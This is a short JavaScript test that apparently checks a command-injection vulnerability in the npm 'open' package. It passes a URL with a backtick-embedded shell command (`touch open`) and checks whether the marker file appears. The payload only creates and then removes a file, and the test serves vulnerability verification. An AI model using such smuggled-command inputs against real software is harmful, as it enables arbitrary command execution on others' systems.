test("Arbitrary code execution in open", () => {
  const fs = require("fs");
  const path = "./open";

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    require("open")("http://example.com/`touch open`", () => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      // fs.unlink(path, function (err) {}); //deleting the file after creation
      fs.unlinkSync(path);
    });
  } catch (error) {}

  //checking that its created by after exploit.
});
